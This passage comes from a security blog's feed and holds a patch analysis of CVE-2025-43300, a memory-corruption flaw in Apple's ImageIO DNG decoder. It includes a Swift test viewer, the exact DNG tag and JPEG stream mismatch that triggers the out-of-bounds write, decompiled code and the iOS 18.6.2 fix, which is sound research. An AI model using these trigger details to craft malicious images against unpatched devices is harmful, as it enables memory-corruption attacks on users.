class="hljs-literal">false</span>    ])    @Published var image: UIImage?    @Published var <span class="hljs-built_in">log</span>: String = <span class="hljs-string">&quot;&quot;</span>    func render(from url: URL) {        <span class="hljs-built_in">log</span> = <span class="hljs-string">&quot;Loading: \(url.lastPathComponent)\n&quot;</span>                guard let raw = CIRAWFilter(imageURL: url, options: [:]) <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;CIRAWFilter unavailable or failed to open URL\n&quot;</span>            <span class="hljs-keyword">return</span>        }          guard let ciImage = raw.value(forKey: kCIOutputImageKey) as? CIImage <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;Failed to get CIImage\n&quot;</span>; <span class="hljs-keyword">return</span>        }        let extent = ciImage.extent.integral        guard let cg = context.createCGImage(ciImage, from: extent) <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;Failed to create CGImage\n&quot;</span>; <span class="hljs-keyword">return</span>        }        image = UIImage(cgImage: cg)        <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;Rendered: \(Int(extent.width))&#xD7;\(Int(extent.height))\n&quot;</span>    }}struct ContentView: View {    @StateObject var renderer = RawRenderer()    @State <span class="hljs-keyword">private</span> var showPicker = <span class="hljs-literal">false</span>    var body: some View {        VStack(spacing: <span class="hljs-number">12</span>) {            <span class="hljs-keyword">if</span> let img = renderer.image {                Image(uiImage: img)                    .resizable()                    .scaledToFit()                    .background(Color.black.opacity(<span class="hljs-number">0.05</span>))                    .cornerRadius(<span class="hljs-number">12</span>)                    .padding(.horizontal)            } <span class="hljs-keyword">else</span> {                Text(<span class="hljs-string">&quot;Open a DNG&quot;</span>).foregroundColor(.secondary)                    .padding(.top, <span class="hljs-number">40</span>)            }            HStack {                Button(<span class="hljs-string">&quot;Open DNG&quot;</span>) { showPicker = <span class="hljs-literal">true</span> }                .buttonStyle(.borderedProminent)                Button(<span class="hljs-string">&quot;Clear&quot;</span>) { renderer.image = nil; renderer.<span class="hljs-built_in">log</span> = <span class="hljs-string">&quot;&quot;</span> }                .buttonStyle(.bordered)            }            ScrollView {                Text(renderer.<span class="hljs-built_in">log</span>)                    .font(.system(.caption, design: .monospaced))                    .frame(maxWidth: .infinity, alignment: .leading)                    .padding()                    .background(Color.black.opacity(<span class="hljs-number">0.03</span>))                    .cornerRadius(<span class="hljs-number">8</span>)            }            .frame(maxHeight: <span class="hljs-number">160</span>)            .padding(.horizontal)        }        .sheet(isPresented: $showPicker) {            DocumentPicker { url in                <span class="hljs-keyword">if</span> let url { renderer.render(from: url) }            }        }    }}struct DocumentPicker: UIViewControllerRepresentable {    var onPick: (URL?) -&gt; Void    func makeCoordinator() -&gt; Coordinator { Coordinator(onPick: onPick) }    func makeUIViewController(context: Context) -&gt; UIDocumentPickerViewController {        <span class="hljs-comment">// DNG UTI&#xB294; &#xC804;&#xD1B5;&#xC801;&#xC73C;&#xB85C; &quot;com.adobe.raw-image&quot;.</span>        <span class="hljs-comment">// iOS 14+&#xC5D0;&#xC120; UTType.image(&#xB610;&#xB294; item)&#xB85C; &#xC5F4;&#xC5B4;&#xB3C4; &#xBB34;&#xBC29;.</span>        let vc = UIDocumentPickerViewController(forOpeningContentTypes: [            UTType(importedAs: <span class="hljs-string">&quot;com.adobe.raw-image&quot;</span>), <span class="hljs-comment">// DNG</span>            .image, .item        ])        vc.allowsMultipleSelection = <span class="hljs-literal">false</span>        vc.delegate = context.coordinator        <span class="hljs-keyword">return</span> vc    }    func updateUIViewController(_ uiViewController: UIDocumentPickerViewController, context: Context) {}    <span class="hljs-keyword">final</span> class Coordinator: NSObject, UIDocumentPickerDelegate {        let onPick: (URL?) -&gt; Void        init(onPick: @escaping (URL?) -&gt; Void) { self.onPick = onPick }        func documentPicker(_ controller: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {            onPick(urls.first)        }        func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) { onPick(nil) }    }}</code></pre><p><img src="/2025/10/23/clalxk/imageIO_en/image19.png" alt="image.png"></p><p>Here is the image that was used.</p><p>Using this viewer to load the PoC DNG file, I observed the following details:</p><ul><li><code>CLosslessJpegUnpacker</code> at <code>0x1DD902E78</code></li><li><code>CDNGLosslessJpegUnpacker</code> at <code>0x1DD95DE88</code></li><li><code>CDNGLosslessJpegUnpacker::unpackTile</code> at <code>0x1DD95B198</code></li><li><code>CLosslessJpegRestartUnpacker</code> at <code>0x1DD95F784</code></li></ul><p><strong>Trigger conditions:</strong></p><ul><li>JPEG marker: <strong>SOF3 (Lossless JPEG)</strong> present</li><li>DHT (Define Huffman Table(s)) present</li><li>SOS (Start Of Scan) valid</li><li><strong>BitsPerSample = 16</strong></li><li><strong>SamplesPerPixel = 2</strong> (TIFF tag)</li><li><strong>NumComponents = 1</strong> (SOF3/JPEG stream)</li></ul><p>The root cause is a mismatch between how the loop termination condition is computed versus how the inner loop performs writes:</p><p><img src="/2025/10/23/clalxk/imageIO_en/image20.png" alt="image.png"></p><ul><li>The outer pixel loop is bounded by <strong>NumComponents</strong> = 1 (so it expects one component per pixel),</li><li>but the inner write routine assumes <strong>SamplesPerPixel</strong> = 2 and writes <strong>two 16-bit samples per pixel</strong>, advancing the destination pointer as if there are two samples per pixel.</li></ul><p>As a result, each row ends up writing <strong>twice</strong> the expected number of bytes &#x2192; <strong>out-of-bounds writes</strong> occur at the row boundary.</p><p>Following the flow, you can trace the chain like:</p><pre><code class="hljs apache"><span class="hljs-attribute">0x1DD95B198</span> &#x2192; <span class="hljs-number">0</span>x<span class="hljs-number">1</span>DD<span class="hljs-number">95</span>B<span class="hljs-number">6</span>C<span class="hljs-number">4</span> &#x2192; <span class="hljs-number">0</span>x<span class="hljs-number">1</span>DD<span class="hljs-number">95</span>B<span class="hljs-number">8</span>DC &#x2192; <span class="hljs-number">0</span>x<span class="hljs-number">1</span>DD<span class="hljs-number">95</span>B<span class="hljs-number">944</span> &#x2192; <span class="hljs-number">0</span>x<span class="hljs-number">1</span>DD<span class="hljs-number">95</span>BCCC</code></pre><p>(Trace through these offsets to map how the pixel decoder iterates and performs the writes.)</p><p><img src="/2025/10/23/clalxk/imageIO_en/image21.png" alt="image.png"></p><p>The sample image I used is from DPReview:</p><p><a href="https://www.dpreview.com/sample-galleries/4949897610/pentax-k-3-mark-iii-sample-gallery/1638788346">https://www.dpreview.com/sample-galleries/4949897610/pentax-k-3-mark-iii-sample-gallery/1638788346</a></p><p>(Used that image as a starting point to craft a DNG variant for the PoC.)</p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>In short, <strong>CVE-2025-43300</strong> is an OOB Write caused by a mismatch between TIFF metadata and the internal JPEG Lossless stream:</p><ul><li><code>SamplesPerPixel = 2</code> (DNG tag) but <code>NumComponents = 1</code> (SOF3 stream)</li><li>Loop termination is computed against <strong>components(=1)</strong> but the inner write loop writes <strong>16-bit &#xD7; 2 samples per pixel</strong>, causing <strong>double writes per row</strong> &#x2192; <strong>OOB write</strong>.</li></ul><p>Using <code>dyld_shared_cache</code> diffs and vtable typeing, I traced the vulnerable path to the <strong>CDNGLosslessJpegUnpacker &#x2192; Tile Unpacker</strong> and identified the exact trigger conditions and dataflow.</p><p>Apple patched the issue in <strong>iOS 18.6.2</strong> by:</p><ol><li>Switching from the fragile <code>CGImage</code> + <code>CFData</code> raw traversal pipeline to a <strong>CMPhoto &#x2192; CVPixelBuffer</strong> pipeline (more robust, standardized pixel buffer APIs).</li><li>Adding explicit <strong>data size / stride validation</strong> (compare <code>CVPixelBufferGetDataSize()</code> to an internally computed expected value that takes stride into account).</li><li>Changing pixel access order/assumptions to match the actual buffer layout.</li></ol><p>If you are on a real device, update to <strong>iOS 18.6.2 or later</strong> &#x2014; the patched code prevents attempts to reach this unsafe write path. (I should update mine too &#x2014; I&#x2019;ll do that soon &#x1F602;)</p><p>That wraps up this short research note &#x2014; the path was a fun exercise in dyld cache extraction, vtable reconstruction, and low-level JPEG/DNG decoding logic. I learned a lot following the call chain and seeing how a subtle metadata mismatch can cause memory corruption.</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://github.com/b1n4r1b01/n-days/blob/main/CVE-2025-43300.md">https://github.com/b1n4r1b01/n-days/blob/main/CVE-2025-43300.md</a></p><p><a href="https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html">https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html</a></p><p><a href="https://github.com/DarkNavySecurity/PoC/tree/main/CVE-2025-43300">https://github.com/DarkNavySecurity/PoC/tree/main/CVE-2025-43300</a></p><p><a href="https://github.com/msuiche/elegant-bouncer">https://github.com/msuiche/elegant-bouncer</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/MacOS/">MacOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-43300/">CVE-2025-43300</category>
      
      <category domain="https://hackyboiz.github.io/tags/ImageIO/">ImageIO</category>
      
      <category domain="https://hackyboiz.github.io/tags/MemoryCorruption/">MemoryCorruption</category>
      
      <category domain="https://hackyboiz.github.io/tags/iOS/">iOS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/23/clalxk/imageIO_en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] ImageIO: iOS/macOS DNG Image Processing Memory Corruption (Ko)</title>
      <link>https://hackyboiz.github.io/2025/10/23/clalxk/imageIO_ko/</link>
      <guid>https://hackyboiz.github.io/2025/10/23/clalxk/imageIO_ko/</guid>
      <pubDate>Thu, 23 Oct 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/10/23/clalxk/imageIO_ko/image.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;~ MacOS &amp;#xC2DC;&amp;#xB9A</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/10/23/clalxk/imageIO_ko/image.png" alt="image.png"></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;~ MacOS &#xC2DC;&#xB9AC;&#xC988;&#xB97C; &#xB9C8;&#xCE58;&#xACE0; &#xC774;&#xBC88;&#xC5D4; ImageIO&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC624;&#xB298;&#xC740; &#xC9C0;&#xB09C; 8&#xC6D4; 20&#xC77C;, iOS/MacOS/iPadOS &#xB4F1;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; ImageIO &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, &#xD2B9;&#xC815; &#xC778;&#xBB3C;&#xC744; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xC545;&#xC6A9;&#xB41C; &#xAC8C; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xD654;&#xC81C;&#xAC00; &#xB418;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xC5B4;&#xB5A4; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xC5C8;&#xB294;&#xC9C0; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! </p><p>&#xC790;.. &#xADF8;&#xB7FC; &#xC2DC;&#xC791;&#xD574;&#xBCFC;&#xAE4C;&#xC694;.. !!!  </p><hr><h1 id="0-ImageIO"><a href="#0-ImageIO" class="headerlink" title="0. ImageIO"></a>0. <a href="https://developer.apple.com/documentation/imageio">ImageIO</a></h1><p>ImageIO&#xB294; Apple&#xC758; macOS, iOS, iPadOS &#xB4F1;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <strong>&#xC774;&#xBBF8;&#xC9C0; &#xCC98;&#xB9AC; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;</strong>&#xB85C;, &#xB2E4;&#xC591;&#xD55C; &#xC774;&#xBBF8;&#xC9C0; &#xD615;&#xC2DD;&#xC758; &#xC77D;&#xAE30;, &#xC4F0;&#xAE30;, &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xC811;&#xADFC;, &#xC555;&#xCD95; &#xBC0F; &#xB514;&#xCF54;&#xB529;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. Apple&#xC758; Core Graphics &#xBC0F; Photos, Preview, Safari, Messages, AirDrop, Mail, iCloud&#xC640; &#xAC19;&#xC740; &#xC2DC;&#xC2A4;&#xD15C; &#xC571;&#xACFC; &#xAE30;&#xB2A5;&#xC758; &#xC774;&#xBBF8;&#xC9C0; &#xCC98;&#xB9AC; &#xBC31;&#xC5D4;&#xB4DC;&#xB85C; &#xD3ED;&#xB113;&#xAC8C; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="1-CVE-2025-43300"><a href="#1-CVE-2025-43300" class="headerlink" title="1. CVE-2025-43300"></a>1. CVE-2025-43300</h1><p><img src="/2025/10/23/clalxk/imageIO_ko/image1.png" alt="image.png"></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Apple ImageIO &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC778; RawCamera&#xC758; JPEG Lossless (<code>SOF3</code>) &#xB514;&#xCF54;&#xB354;(<code>CDNGLosslessJpegUnpacker</code>)&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; OOB Write &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, DNG &#xD30C;&#xC77C;&#xC758; TIFF &#xD0DC;&#xADF8;(<code>SamplesPerPixel</code>)&#xC640; &#xB0B4;&#xBD80; JPEG &#xC2A4;&#xD2B8;&#xB9BC;&#xC758; component &#xC218;&#xAC00; &#xBD88;&#xC77C;&#xCE58;&#xD560; &#xB54C; &#xC798;&#xBABB;&#xB41C; &#xB8E8;&#xD504; &#xC0C1;&#xD55C; &#xB54C;&#xBB38;&#xC5D0; &#xCD9C;&#xB825; &#xBC84;&#xD37C;&#xB97C; &#xB118;&#xACA8; &#xC4F0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC9C0;&#xB09C; 8&#xC6D4; 20&#xC77C;&#xC5D0; iOS 18.6.2 &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;(&#xD328;&#xCE58;) &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD55C; &#xBC84;&#xC804;: 18.6.1</li><li>&#xD328;&#xCE58; &#xB41C; &#xBC84;&#xC804;: 18.6.2</li></ul><p><img src="/2025/10/23/clalxk/imageIO_ko/image2.png" alt="image.png"></p><p>&#xC6B0;&#xC120; 18.6.2 &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC5B4;&#xB290; &#xBD80;&#xBD84;&#xC774; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0;&#xC790; &#xD569;&#xB2C8;&#xB2E4;.</p><p>ipsw &#xBC84;&#xC804; &#xBCC4;&#xB85C; diff&#xD55C; &#xACB0;&#xACFC;&#xB97C; &#xC62C;&#xB824;&#xC8FC;&#xB294; <a href="https://github.com/blacktop/ipsw-diffs/tree/main"><strong>ipsw-diffs</strong></a>&#xB97C; &#xD1B5;&#xD574; 18.6.1&#xACFC; 18.6.2&#xC758; diff &#xB0B4;&#xC6A9;&#xC744; &#xB300;&#xB7B5;&#xC801;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>RawCamera</strong></p><blockquote><p>/System/Library/CoreServices/RawCamera.bundle/RawCamera</p></blockquote><pre><code class="hljs bash">-1738.140.3.0.0-  __TEXT.__text: 0x1e2d70-  __TEXT.__auth_stubs: 0x1850+1738.140.3.0.11+  __TEXT.__text: 0x1e3470+  __TEXT.__auth_stubs: 0x1870   __TEXT.__objc_methlist: 0x16e4   __TEXT.__const: 0x15326-  __TEXT.__gcc_except_tab: 0x2d440+  __TEXT.__gcc_except_tab: 0x2d588   __TEXT.__oslogstring: 0xec0   __TEXT.__cstring: 0xee23   __TEXT.__dof_RawCamera: 0x8f7-  __TEXT.__unwind_info: 0xb1d0+  __TEXT.__unwind_info: 0xb1e8   __TEXT.__eh_frame: 0x278   __TEXT.__objc_classname: 0x4b9   __TEXT.__objc_methname: 0x3918   __TEXT.__objc_methtype: 0xdd3   __TEXT.__objc_stubs: 0x2da0-  __DATA_CONST.__got: 0x9b0+  __DATA_CONST.__got: 0x9c8   __DATA_CONST.__const: 0x2a18   __DATA_CONST.__objc_classlist: 0x1e0   __DATA_CONST.__objc_catlist: 0x20   __DATA_CONST.__objc_imageinfo: 0x8   __DATA_CONST.__objc_selrefs: 0xcf8   __DATA_CONST.__objc_superrefs: 0xf0-  __DATA_CONST.__objc_arraydata: 0x3948-  __AUTH_CONST.__auth_got: 0xc40+  __DATA_CONST.__objc_arraydata: 0x3950+  __AUTH_CONST.__auth_got: 0xc50   __AUTH_CONST.__const: 0x35978   __AUTH_CONST.__cfstring: 0x18080   __AUTH_CONST.__objc_const: 0x48b0-  __AUTH_CONST.__objc_arrayobj: 0x570-  __AUTH_CONST.__objc_intobj: 0x39f0+  __AUTH_CONST.__objc_arrayobj: 0x588+  __AUTH_CONST.__objc_intobj: 0x3a20   __AUTH_CONST.__objc_doubleobj: 0x480   __AUTH_CONST.__objc_dictobj: 0x4d58   __AUTH_CONST.__objc_floatobj: 0xc0   - /System/Library/Frameworks/UniformTypeIdentifiers.framework/UniformTypeIdentifiers   - /System/Library/PrivateFrameworks/AppleJPEG.framework/AppleJPEG   - /System/Library/PrivateFrameworks/AppleJPEGXL.framework/AppleJPEGXL+  - /System/Library/PrivateFrameworks/CMPhoto.framework/CMPhoto   - /System/Library/PrivateFrameworks/CoreAnalytics.framework/CoreAnalytics   - /System/Library/PrivateFrameworks/MobileAsset.framework/MobileAsset   - /usr/lib/libSystem.B.dylib   - /usr/lib/libobjc.A.dylib   - /usr/lib/libxml2.2.dylib   - /usr/lib/libz.1.dylib-  UUID: 1BE38EB6-51C0-3069-A50F-CA3B000E0847-  Functions: 6433-  Symbols:   781+  UUID: AF5B7B35-3549-329B-B706-F877FA8DF849+  Functions: 6435+  Symbols:   786   CStrings:  7487 Symbols:+ _CMPhotoDecompressionContainerCreateImageForIndex+ _CMPhotoDecompressionContainerGetImageCount+ _CMPhotoDecompressionSessionCreate+ _CMPhotoDecompressionSessionCreateContainer+ _CVPixelBufferGetDataSize+ _kCMPhotoContainerFormatString_JFIF+ _kCMPhotoDecompressionContainerOption_AllowedFormatsAndCodecs+ _kCMPhotoDecompressionOption_OutputPixelFormat- _CGImageGetBytesPerRow- _CGImageGetHeight- _CGImageGetWidth</code></pre><p>&#xB2E4;&#xB978; &#xBD80;&#xBD84;&#xC740; &#xBC14;&#xB010; &#xAC8C; &#xC5C6;&#xACE0; <strong>RawCamera</strong>&#xB9CC; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xCF54;&#xB4DC; &#xB808;&#xBCA8;&#xC774; &#xBCF4;&#xC774;&#xC9C0; &#xC54A;&#xC544;&#xC11C; ida&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/23/clalxk/imageIO_ko/image3.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_ko/image4.png" alt="image.png"></p><p>ipsw&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; 18.6.1 &#xACFC; 18.6.2 &#xBC84;&#xC804;&#xC744; &#xB2E4;&#xC6B4;&#xBC1B;&#xC544; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/23/clalxk/imageIO_ko/image5.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_ko/image6.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_ko/image7.png" alt="image.png"></p><p><code>dyld_shared_cache</code> &#xB294; iOS/macOS&#xAC00; &#xBD80;&#xD305; &#xC2DC; <strong>&#xC790;&#xC8FC; &#xC4F0;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB7;&#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xD55C; &#xB369;&#xC5B4;&#xB9AC;&#xB85C; &#xBBF8;&#xB9AC; &#xBB36;&#xC5B4; &#xB454; &#xCE90;&#xC2DC; &#xD30C;&#xC77C;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xAC01;&#xC885; <code>.dylib</code> / Framework&#xB4E4;&#xC774; <strong>&#xCD5C;&#xC801;&#xD654;</strong>&#xB41C; &#xC0C1;&#xD0DC;&#xB85C; &#xB4E4;&#xC5B4; &#xC788;&#xC5B4; &#xC571; &#xC2DC;&#xC791;&#xC774; &#xBE68;&#xB77C;&#xC9C0;&#xACE0; &#xBA54;&#xBAA8;&#xB9AC; &#xC0AC;&#xC6A9;&#xC774; &#xC904;&#xC5B4;&#xB4DC;&#xB294; &#xD2B9;&#xC9D5;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C; &#xAE30;&#xAE30;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB418;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xBC14;&#xB85C; &#xC774; &#xCE90;&#xC2DC; &#xC548;&#xC758; &#xC774;&#xBBF8;&#xC9C0;&#xB4E4;&#xC774;&#xB77C;, &#xCE90;&#xC2DC;&#xC5D0;&#xC11C; RawCamera &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xC5EC; &#xBD84;&#xC11D;/&#xBE44;&#xAD50;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB807;&#xAC8C; ipsw dyld extract&#xC744; &#xD1B5;&#xD574; RawCamera&#xB97C; &#xCD94;&#xCD9C;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC;, &#xBCF8; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C;&#xB294; ida&#xC5D0;&#xC11C; &#xBC14;&#xB85C; dyld_shared_cache&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xC5EC; &#xBD84;&#xC11D;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="1-1-bindiff"><a href="#1-1-bindiff" class="headerlink" title="1.1 bindiff"></a>1.1 bindiff</h2><p><img src="/2025/10/23/clalxk/imageIO_ko/image8.png" alt="image.png"></p><p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; BinExport &#xD3EC;&#xB9F7;&#xC73C;&#xB85C; &#xCD94;&#xCD9C;&#xD558;&#xC5EC; &#xB514;&#xD551;&#xC744; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/23/clalxk/imageIO_ko/image9.png" alt="image.png"></p><p>&#xC6A9;&#xB7C9;&#xC774; &#xBD80;&#xC871;&#xD558;&#xC5EC; bindiff&#xB294; &#xACF5;&#xAC1C;&#xB41C; &#xBD84;&#xC11D; &#xAE00;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xCC38;&#xACE0;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xCD9C;&#xCC98;: <a href="https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html">https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html</a></p><p>&#xBCC0;&#xACBD;&#xC0AC;&#xD56D;&#xC774; &#xC788;&#xB358; &#xAC83;&#xC740; 6&#xAC1C;&#xC758; &#xD568;&#xC218;&#xC600;&#xC9C0;&#xB9CC;, &#xC774; &#xC911;&#xC5D0;&#xC11C;&#xB3C4; &#xD06C;&#xAC8C; &#xC218;&#xC815;&#xB41C; &#xD568;&#xC218;&#xB294; <code>sub_1DD8A7684</code> &#xC640; <code>sub_1DD95DC1C</code> &#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB450;&#xAC1C;&#xC758; &#xD568;&#xC218;&#xB97C; &#xC911;&#xC2EC;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h2 id="1-2-Analysis"><a href="#1-2-Analysis" class="headerlink" title="1.2 Analysis"></a>1.2 Analysis</h2><p><img src="/2025/10/23/clalxk/imageIO_ko/image10.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_ko/image11.png" alt="image.png"></p><p>ipsw&#xC5D0;&#xC11C; &#xCD94;&#xCD9C;&#xD55C; <code>dyld_shared_cache</code> &#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xBD84;&#xC11D;&#xD558;&#xACE0;&#xC790; &#xD569;&#xB2C8;&#xB2E4;.</p><p><em>Apple DYLD Cache for arm64e (select module(s)) &#x2192; RawCamera</em> </p><p><img src="/2025/10/23/clalxk/imageIO_ko/image12.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_ko/image13.png" alt="image.png"></p><p>&#xC774;&#xBBF8;&#xC9C0; &#xD53D;&#xC140; &#xBC84;&#xD37C;&#xC0AC;&#xC774;&#xC988;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xB2E8;&#xACC4;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><p>&#xC0C1;&#xC138; &#xCF54;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xB97C; &#xCC38;&#xACE0;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p><h3 id="&#xCF54;&#xB4DC;-&#xBD84;&#xC11D;"><a href="#&#xCF54;&#xB4DC;-&#xBD84;&#xC11D;" class="headerlink" title="&#xCF54;&#xB4DC; &#xBD84;&#xC11D;"></a>&#xCF54;&#xB4DC; &#xBD84;&#xC11D;</h3><p><code>sub_1DD8A7684</code> &#x2192; <code>sub_1DD8A76DC</code> </p><pre><code class="hljs cpp"># iOS <span class="hljs-number">18.6</span><span class="hljs-number">.1</span> G90<span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_1DD8A7684</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        _QWORD *a1,</span></span><span class="hljs-function"><span class="hljs-params">        __int64 a2,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a3,</span></span><span class="hljs-function"><span class="hljs-params">        __int64 a4,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a5,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a6,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a7,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a8,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">const</span> UInt8 *a9,</span></span><span class="hljs-function"><span class="hljs-params">        CFIndex a10)</span></span><span class="hljs-function"></span>{  .  .  .    v12 = CFDataCreateWithBytesNoCopy_6(          (CFAllocatorRef)*kCFAllocatorDefault_ptr,          a9,          a10,          (CFAllocatorRef)*kCFAllocatorNull_ptr);  v13 = CGImageSourceCreateWithData_5(v12, <span class="hljs-number">0L</span>L);  ImageAtIndex = CGImageSourceCreateImageAtIndex(v13, <span class="hljs-number">0L</span>L, <span class="hljs-number">0L</span>L);  BytesPerRow_3 = CGImageGetBytesPerRow_3(ImageAtIndex);  <span class="hljs-keyword">if</span> ( CGImageGetWidth_12(ImageAtIndex) != a5    || (Height_12 = CGImageGetHeight_12(ImageAtIndex), Height_12 != a6)    || (DataProvider_3 = CGImageGetDataProvider_3(ImageAtIndex),        v16 = CGDataProviderCopyData_2(DataProvider_3),        (v17 = v16) == <span class="hljs-number">0L</span>L) )  {    exception_15 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);    <span class="hljs-built_in">std</span>::runtime_error::runtime_error(exception_15, <span class="hljs-string">&quot;RawCameraException&quot;</span>);    __cxa_throw(exception_15, `typeinfo <span class="hljs-keyword">for</span><span class="hljs-number">&apos;</span><span class="hljs-built_in">std</span>::runtime_error, <span class="hljs-built_in">std</span>::runtime_error::~runtime_error);  }  <span 